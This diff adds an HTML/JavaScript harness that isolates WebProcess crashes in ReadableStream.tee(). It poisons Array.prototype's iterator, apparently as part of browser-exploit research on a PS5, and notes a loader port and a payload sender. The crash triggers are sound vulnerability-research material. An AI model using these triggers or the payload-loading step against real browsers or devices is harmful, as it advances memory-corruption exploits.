@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V903 - tee() crash isolation (one case per load, last-stage, hang-vs-crash)</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  h2 { color:#39c5bb; font-size:13px; margin:14px 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.5; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  table { border-collapse:collapse; font-size:11px; margin-top:8px; }
+  td,th { border:1px solid #30363d; padding:3px 7px; text-align:left; vertical-align:top; }
+  th { color:#58a6ff; }
+  .crash { color:#ff7b72; }
+  .ok { color:#7ee787; }
+  .skip { color:#d29922; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+</style>
+</head>
+<body>
+<h1>V903 - tee() crash isolation</h1>
+<p>
+Purpose: find <b>where</b> the under-yield <code>tee()</code> dies, not to read a freed slot.
+One case per page load (one shot per WebProcess). The last stage reached is written to
+<code>localStorage</code> synchronously <i>before</i> the next step, so if the WebProcess dies the
+next load reports <code>CRASH last=&lt;case&gt;:&lt;stage&gt;</code>. No per-stage network traffic inside
+the iterator, so the heap is not groomed by the harness itself.
+</p>
+<p>
+Start: <b>?op=auto</b> &nbsp;|&nbsp; one case: <b>?case=y1</b> &nbsp;|&nbsp; clear: <b>?reset=1</b>
+</p>
+<p>
+Safety: cases <code>y1</code>, <code>y1_doneval</code>, <code>y1r2</code>, <code>y1_noise</code>,
+<code>y0</code>, <code>w_y1</code> are expected to kill the WebProcess. Re-open <b>?op=auto</b>
+after a crash; the harness records <code>CRASH</code> and continues with the next case.
+</p>
+
+<h2>Cases</h2>
+<pre>
+ctl          normal tee(), no iterator poison                      (control, must survive)
+y2_stream    iterator yields 2 real ReadableStreams               (size 2)
+y2_plain     iterator yields 2 plain objects                      (size 2, wrong shape)
+y2_ab        iterator yields [ArrayBuffer, plain object]          (size 2, wrong type)
+y2_undef     iterator yields [plain, undefined]                   (primitive -> TypeError expected)
+y2_null      iterator yields [plain, null]                        (primitive -> TypeError expected)
+y2_num       iterator yields [plain, 1]                           (primitive -> TypeError expected)
+y3           iterator yields 3 plain objects                      (over-yield, size 3)
+same2        iterator yields the SAME object twice                (size 2, private-slot inversion)
+y1_throw     1 item, then next() throws                           (exception path)
+own          fresh 32-byte random nonce -> tee -> read -> compare (provenance control)
+w_y2         y2_stream inside a Worker                            (worker control)
+y1_doneval   1 item, then {done:true, value:object}               (is done-value used? expect crash)
+y1r2         1 item, then done                                    (repeatability)
+y1_noise     1200 allocated objects, then 1 item, then done       (heap-noise invariance)
+y0           iterator returns done immediately (0 items)          (expect crash)
+w_y1         1 item, then done, inside a Worker                   (process vs worker death)
+w_y1inf      1 item, then infinite done:false, inside a Worker    (hang vs crash discriminator)
+</pre>
+
+<p>
+<code>own</code> answers the "did we read our own data?" question directly: it writes a fresh
+random nonce into a 64-byte buffer, tees it, reads branch 1, and reports whether the 32 nonce
+bytes came back unchanged. If <code>nonceMatch=true</code>, the bytes are owned by the test; they
+are not evidence of unowned memory.
+</p>
+
+<p>
+Worker cases use <code>v903-worker.js</code> (same origin). If the whole WebProcess dies on
+<code>w_y1</code> the main thread never sends <code>V903-MAIN-ALIVE</code>; if only the worker
+spins, <code>V903-MAIN-ALIVE</code> arrives and the worker is terminated. That is the
+crash-vs-hang discriminator.
+</p>
+
+<p>
+Crash report / stack: the harness gives the exact last stage and a deterministic signature.
+A native stack trace still needs the console's own log (<code>/dev/klog</code>). If a loader is
+reachable on the console (port 9027) run:
+<code>python3 tools/send.py &lt;PS5_IP&gt; 9027 payloads/klog.js --arg follow --arg sec=120 --arg grep=WebProcess</code>
+before re-running the crashing case. Without that, the last-stage + worker discrimination below
+is the strongest device-side evidence available.
+</p>
+
+<pre id="out">starting...</pre>
+<div id="tbl"></div>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+var NOISE = [];
+
+function lsGet(k) { try { return window.localStorage.getItem('v903_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v903_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v903_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V903-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+
+/* ---------- shared helpers ---------- */
+function mkStream() { return new ReadableStream({ start: function () {}, pull: function () {}, cancel: function () {} }); }
+function plainTee() { return new ReadableStream({ start: function (c) { c.close(); } }).tee(); }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 90) : 'none'; }
+function safeType(v) { try { return typeof v; } catch (e) { return 'E'; } }
+function safeInst(v) { try { return v instanceof ReadableStream; } catch (e) { return 'E'; } }
+function safeLocked(v) { try { return String(v.locked); } catch (e) { return 'throw:' + (e && e.name); } }
+function toHex(u8) { if (!u8) return 'null'; var s = '', i; for (i = 0; i < u8.length; i++) s += ('0' + u8[i].toString(16)).slice(-2); return s; }
+
+function mkRes(ctx, v, d) {
+  var o = {};
+  Object.defineProperty(o, 'value', {
+    get: function () { ctx.valRead++; return v; }, enumerable: true, configurable: true
+  });
+  Object.defineProperty(o, 'done', {
+    get: function () { ctx.doneRead++; return d; }, enumerable: true, configurable: true
+  });
+  return o;
+}
+
+function stLast(ctx, stage, extra) {
+  try { lsSet('last', ctx.id + ':' + stage + (extra ? ':' + extra : '')); } catch (e) {}
+}
+
+/* iterator: yields values[] with done=false, then a done result.
+ * opts.throwAt   : throw on next() call #k
+ * opts.doneHasValue / doneValue : include value in the done result
+ * opts.infinite  : never return done (hang test; worker only)
+ * opts.quietAfter: stop emitting worker stage beacons after N next() calls
+ */
+function iterOf(ctx, values, opts) {
+  opts = opts || {};
+  var i = 0;
+  var it = {
+    next: function () {
+      var n = ++ctx.next;
+      stLast(ctx, 'N' + n + '-pre');
+      if (opts.quietAfter && n > opts.quietAfter) {
+        /* no beacon; used by the infinite worker case */
+      }
+      if (opts.throwAt === n) {
+        stLast(ctx, 'N' + n + '-throw');
+        throw new Error('v903-throw-at-' + n);
+      }
+      if (i < values.length) {
+        var v = values[i++];
+        stLast(ctx, 'N' + n + '-ret', 'done=false,t=' + safeType(v));
+        return mkRes(ctx, v, false);
+      }
+      if (opts.infinite) {
+        stLast(ctx, 'N' + n + '-ret', 'done=false,inf');
+        return mkRes(ctx, { inf: n }, false);
+      }
+      if (opts.doneHasValue) {
+        stLast(ctx, 'N' + n + '-ret', 'done=true,hasVal');
+        return mkRes(ctx, opts.doneValue, true);
+      }
+      stLast(ctx, 'N' + n + '-ret', 'done=true');
+      return mkRes(ctx, undefined, true);
+    }
+  };
+  if (opts.withReturn) {
+    it['return'] = function () { ctx.ret++; stLast(ctx, 'RET'); return { done: true }; };
+  }
+  it[Symbol.iterator] = function () { return this; };
+  return it;
+}
+
+function describe(z, err, ctx) {
+  var s = 'err=' + err +
+          ',it=' + ctx.iter + ',next=' + ctx.next +
+          ',valRead=' + ctx.valRead + ',doneRead=' + ctx.doneRead + ',ret=' + ctx.ret;
+  if (!z) return s + ',z=null';
+  s += ',zLen=' + z.length;
+  s += ',t0=' + safeType(z[0]) + ',t1=' + safeType(z[1]);
+  s += ',i0=' + safeInst(z[0]) + ',i1=' + safeInst(z[1]);
+  s += ',l0=' + safeLocked(z[0]) + ',l1=' + safeLocked(z[1]);
+  s += ',same01=' + (z[0] === z[1]);
+  return s;
+}
+
+/* ---------- case table ---------- */
+var SPECS = {
+  y2_stream:  { values: function () { return [mkStream(), mkStream()]; } },
+  y2_plain:   { values: function () { return [{ a: 1 }, { b: 2 }]; } },
+  y2_ab:      { values: function () { return [new ArrayBuffer(8), { b: 2 }]; } },
+  y2_undef:   { values: function () { return [{ a: 1 }, undefined]; } },
+  y2_null:    { values: function () { return [{ a: 1 }, null]; } },
+  y2_num:     { values: function () { return [{ a: 1 }, 1]; } },
+  y3:         { values: function () { return [{ a: 1 }, { b: 2 }, { c: 3 }]; } },
+  same2:      { values: function () { var x = { same: 1 }; return [x, x]; } },
+  y1_throw:   { values: function () { return [{ a: 1 }]; }, opts: { throwAt: 2 } },
+  y1_doneval: { values: function () { return [{ a: 1 }]; }, opts: { doneHasValue: true, doneValue: { dv: 1 } } },
+  y1:         { values: function () { return [{ a: 1 }]; } },
+  y1r2:       { values: function () { return [{ a: 1 }]; } },
+  y1_noise:   { values: function () { return [{ a: 1 }]; }, noise: 1200 },
+  y0:         { values: function () { return []; } }
+};
+
+function runMainCase(id, ctx) {
+  if (id === 'ctl') {
+    lsSet('last', id + ':S3-before-tee');
+    var z0 = null, e0 = 'none';
+    try { z0 = plainTee(); } catch (e) { e0 = errOf(e); }
+    lsSet('last', id + ':S4-after-tee');
+    if (z0) {
+      try { z0[0] && z0[0].cancel(); } catch (e) {}
+      try { z0[1] && z0[1].cancel(); } catch (e) {}
+    }
+    return { tag: 'OK', detail: describe(z0, e0, ctx) };
+  }
+
+  var spec = SPECS[id];
+  if (!spec) return { tag: 'SKIP', detail: 'unknown-case' };
+
+  if (spec.noise) {
+    for (var si = 0; si < spec.noise; si++) {
+      NOISE.push({ i: si, s: ('n' + si).slice(0, 12), a: [si, si + 1] });
+    }
+    lsSet('last', id + ':S2b-noise=' + NOISE.length);
+  }
+
+  var saved = Array.prototype[Symbol.iterator];
+  var z = null, err = 'none';
+  Array.prototype[Symbol.iterator] = function () {
+    ctx.iter++;
+    lsSet('last', id + ':S2-iterfn');
+    return iterOf(ctx, spec.values(), spec.opts);
+  };
+  lsSet('last', id + ':S3-before-tee');
+  try { z = plainTee(); } catch (e) { err = errOf(e); }
+  lsSet('last', id + ':S4-after-tee');
+  try { Array.prototype[Symbol.iterator] = saved; } catch (e) {}
+  if (z) {
+    try { z[0] && z[0].cancel(); } catch (e) {}
+    try { z[1] && z[1].cancel(); } catch (e) {}
+  }
+  return { tag: (err === 'none') ? 'OK' : 'THROW', detail: describe(z, err, ctx) };
+}
+
+async function runOwnCase(ctx) {
+  var data = new Uint8Array(64);
+  var nonce = new Uint8Array(32);
+  if (window.crypto && window.crypto.getRandomValues) window.crypto.getRandomValues(nonce);
+  else for (var q = 0; q < 32; q++) nonce[q] = (Math.random() * 256) & 0xff;
+  for (var i = 0; i < 32; i++) data[i] = nonce[i];
+  for (var j = 32; j < 64; j++) data[j] = 0xA5;
+
+  lsSet('last', ctx.id + ':S3-before-tee');
+  var src = new ReadableStream({ start: function (c) { c.enqueue(data); c.close(); } });
+  var pair = src.tee();
+  lsSet('last', ctx.id + ':S4-after-tee');
+
+  var r = null, err = 'none';
+  try { r = await pair[0].getReader().read(); } catch (e) { err = errOf(e); }
+  var v = r && r.value;
+  var match = !!(v && v.length === 64);
+  if (match) {
+    for (var k = 0; k < 32; k++) if (v[k] !== nonce[k]) { match = false; break; }
+    if (match) for (var k2 = 32; k2 < 64; k2++) if (v[k2] !== 0xA5) { match = false; break; }
+  }
+  try { pair[0].cancel(); } catch (e) {}
+  try { pair[1].cancel(); } catch (e) {}
+  var detail = 'err=' + err + ',readLen=' + (v ? v.length : 0) +
+               ',sameObject=' + (v === data) + ',nonceMatch=' + match +
+               ',nonce=' + toHex(nonce) + ',hex=' + toHex(v);
+  lsSet('last', ctx.id + ':S5-done');
+  return { tag: match ? 'OK' : 'THROW', detail: detail };
+}
+
+function runWorkerCase(id) {
+  return new Promise(function (resolve) {
+    var ctx = { id: id };
+    var finished = false;
+    var w = null, t1 = null, t2 = null;
+
+    function fin(tag, detail) {
+      if (finished) return;
+      finished = true;
+      if (t1) clearTimeout(t1);
+      if (t2) clearTimeout(t2);
+      try { if (w) w.terminate(); } catch (e) {}
+      lsSet('last', id + ':S5-done');
+      resolve({ tag: tag, detail: detail });
+    }
+
+    if (typeof Worker === 'undefined') {
+      return fin('SKIP', 'no Worker');
+    }
+
+    lsSet('last', id + ':S1-worker-start');
+    try {
+      w = new Worker('v903-worker.js?case=' + encodeURIComponent(id) + '&run=' + encodeURIComponent(RUN));
+    } catch (e) {
+      return fin('THROW', 'worker-ctor=' + errOf(e));
+    }
+
+    w.onmessage = function (e) {
+      fin('OK', 'worker-msg=' + JSON.stringify(e.data));
+    };
+    w.onerror = function (e) {
+      bks('W-ERROR', id + ':' + (e && (e.message || e.type) || 'unknown'));
+      fin('THROW', 'worker-error=' + (e && (e.message || e.type) || 'unknown'));
+    };
+
+    var aliveMs = (id === 'w_y1inf') ? 2500 : 4000;
+    t1 = setTimeout(function () {
+      bks('MAIN-ALIVE', 'case=' + id + ',ms=' + aliveMs);
+      if (id === 'w_y1inf') {
+        bks('W-TERM', 'case=' + id + ',reason=hang-main-alive=1');
+        fin('OK', 'hang-detected(MainAlive after ' + aliveMs + 'ms)');
+      }
+    }, aliveMs);
+
+    t2 = setTimeout(function () {
+      bks('MAIN-ALIVE', 'case=' + id + ',ms=12000');
+      fin('OK', 'no-worker-message-after-12000ms');
+    }, 12000);
+  });
+}
+
+/* ---------- runner ---------- */
+var SEQUENCE = [
+  'ctl', 'y2_stream', 'y2_plain', 'y2_ab', 'y2_undef', 'y2_null', 'y2_num',
+  'y3', 'same2', 'y1_throw', 'own', 'w_y2',
+  'y1_doneval', 'y1r2', 'y1_noise', 'y0', 'w_y1', 'w_y1inf'
+];
+
+function appendRes(s) { lsSet('res', (lsGet('res') || '') + s + ';'); }
+function isDone(id) { return (lsGet('done') || ';').indexOf(';' + id + ';') >= 0; }
+function markDone(id) { var d = lsGet('done') || ';'; if (d.indexOf(';' + id + ';') < 0) lsSet('done', d + id + ';'); }
+function nextCase() { for (var i = 0; i < SEQUENCE.length; i++) { if (!isDone(SEQUENCE[i])) return SEQUENCE[i]; } return null; }
+
+function esc(s) { return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
+function render() {
+  var r = lsGet('res') || '';
+  var rows = r.split(';');
+  var html = '<table><tr><th>case</th><th>tag</th><th>detail (last stage on crash)</th></tr>';
+  for (var i = 0; i < rows.length; i++) {
+    if (!rows[i]) continue;
+    var p = rows[i].split('|');
+    var cls = (p[1] === 'CRASH') ? 'crash' : (p[1] === 'SKIP' ? 'skip' : 'ok');
+    html += '<tr><td>' + esc(p[0]) + '</td><td class="' + cls + '">' + esc(p[1]) +
+            '</td><td>' + esc(p[2] || '') + '</td></tr>';
+  }
+  html += '</table>';
+  document.getElementById('tbl').innerHTML = html;
+  say('--- recorded so far ---');
+  say(r);
+}
+
+async function runCase(id) {
+  var ctx = { id: id, iter: 0, next: 0, valRead: 0, doneRead: 0, ret: 0 };
+  bks('START', 'case=' + id + ',run=' + RUN);
+  lsSet('cur', id);
+  lsSet('last', id + ':S0-enter');
+
+  var r;
+  if (id === 'own') r = await runOwnCase(ctx);
+  else if (id.indexOf('w_') === 0) r = await runWorkerCase(id);
+  else r = runMainCase(id, ctx);
+
+  var tag = r.tag, detail = r.detail || '';
+  appendRes(id + '|' + tag + '|' + detail);
+  markDone(id);
+  lsSet('cur', '');
+  lsSet('last', id + ':S9-done');
+  bks('DONE', 'case=' + id + ',tag=' + tag + ',detail=' + detail.slice(0, 400));
+  say(id + ' -> ' + tag + ' ' + detail);
+  render();
+  return r;
+}
+
+async function main() {
+  var q = location.search;
+
+  if (q.indexOf('reset=1') >= 0) {
+    lsDel('cur'); lsDel('done'); lsDel('res'); lsDel('last');
+    bks('RESET', 'cleared,run=' + RUN);
+    say('cleared. reopen with ?op=auto');
+    render();
+    return;
+  }
+
+  var cur = lsGet('cur');
+  if (cur) {
+    var last = lsGet('last') || '?';
+    appendRes(cur + '|CRASH|last=' + last);
+    markDone(cur);
+    lsDel('cur');
+    lsDel('last');
+    bks('CRASH-DETECTED', 'case=' + cur + ',last=' + last + ',run=' + RUN);
+    say('previous case CRASHED: ' + cur + ' last=' + last);
+  }
+
+  var m = /[?&]case=([^&]+)/.exec(q);
+  var one = m ? decodeURIComponent(m[1]) : '';
+  var auto = (q.indexOf('op=auto') >= 0) || (!one && q.indexOf('case=') < 0);
+
+  if (one) {
+    var rr = await runCase(one);
+    say('single case done: ' + one + ' -> ' + rr.tag);
+    render();
+    return;
+  }
+
+  if (auto) {
+    var id = nextCase();
+    if (!id) {
+      bks('FINAL', 'run=' + RUN + ',res=' + (lsGet('res') || '').slice(0, 460));
+      say('ALL CASES DONE.');
+      render();
+      return;
+    }
+    await runCase(id);
+    setTimeout(function () { location.href = SEEK + '?op=auto&r=' + Date.now(); }, 600);
+    return;
+  }
+
+  say('ready. use ?op=auto or ?case=<id>');
+  render();
+}
+
+try { main(); } catch (e) { bks('FATAL', errOf(e)); say('FATAL ' + errOf(e)); }
+</script>
+</body>
+</html>
